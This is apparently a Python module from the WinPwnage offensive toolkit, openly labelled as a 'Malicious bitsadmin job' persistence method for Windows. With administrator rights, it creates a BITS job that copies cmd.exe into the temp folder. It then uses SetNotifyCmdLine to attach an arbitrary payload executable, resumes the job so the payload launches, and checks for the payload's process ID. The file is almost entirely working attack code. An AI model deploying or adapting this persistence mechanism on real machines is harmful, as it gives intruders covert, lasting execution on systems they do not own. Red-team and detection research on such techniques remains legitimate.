from winpwnage.core.prints import *
from winpwnage.core.utils import *
from winpwnage.core.winstructures import *
import tempfile
import time
import os

#Creds: https://oddvar.moe and https://github.com/3gstudent/bitsadminexec

persistMethod11_info = {
	"Description": "Persistence using bitsadmin.exe",
	"Method": "Malicious bitsadmin job",
	"Id": "11",
	"Type": "Persistence",
	"Fixed In": "99999" if information().admin() == True else "0",
	"Works From": "7600",
	"Admin": True,
	"Function Name": "persistMethod11",
	"Function Payload": True,
}

def persistMethod11(payload, name="", add=True):
	if not information().admin():
		print_error("Cannot proceed, we are not elevated")
		return False

	if add:
		if payloads().exe(payload):
			# if fails, anti-virus is probably blocking this method
			with disable_fsr():
				exit_code = process().create("bitsadmin.exe", params="/create {}".format(name), get_exit_code=True)
				if exit_code == 0:
					print_success("Successfully created job ({}) exit code ({})".format(name, exit_code))
				else:
					print_error("Unable to create job ({}) exit code ({})".format(name, exit_code))

				exit_code = process().create("bitsadmin.exe", params="/addfile {} {} {}".format(name,os.path.join(information().system_directory(),
							"cmd.exe"),os.path.join(tempfile.gettempdir(),"cmd.exe")), get_exit_code=True)
				if exit_code == 0:
					print_success("Successfully added file ({}) to specified job ({}) exit code ({})".format(os.path.join(information().system_directory(), "cmd.exe"), name, exit_code))
				else:
					print_error("Unable to add file ({}) to specified job ({}) exit code ({})".format(os.path.join(information().system_directory(), "cmd.exe"), name, exit_code))

				exit_code = process().create("bitsadmin.exe", params='/SetNotifyCmdLine {} {} NULL'.format(name, payloads().exe(payload)[1]), get_exit_code=True)
				if exit_code == 0:
					print_success("Successfully attached payload ({}) to job ({}) exit code ({})".format(payloads().exe(payload)[1], name, exit_code))
				else:
					print_error("Unable to attach payload ({}) to job ({}) exit code ({})".format(payloads().exe(payload)[1], name, exit_code))

				exit_code = process().create("bitsadmin.exe", params="/Resume {}".format(name), get_exit_code=True)
				if exit_code == 0:
					print_success("Successfully initiated job ({}) exit code ({})".format(name, exit_code))
				else:
					print_error("Unable to initiate job ({}) exit code ({})".format(name, exit_code))

			time.sleep(5)

			pid = process().get_process_pid(os.path.split(payloads().exe(payload)[1])[1])
			if pid:
				print_success("Successfully started payload PID: {}".format(pid))
			else:
				print_error("Unable to start payload")
		else:
			print_error("Cannot proceed, invalid payload")
			return False
	else:
		print_info("Performing cleanup")
		exit_code = process().create("bitsadmin.exe",
					params="/complete {}".format(name),
					get_exit_code=True)

		if exit_code == 0:
			print_success("Successfully deleted job ({}) exit code ({})".format(name, exit_code))
		else:
			print_error("Unable to delete job ({}) exit code ({})".format(name, exit_code))
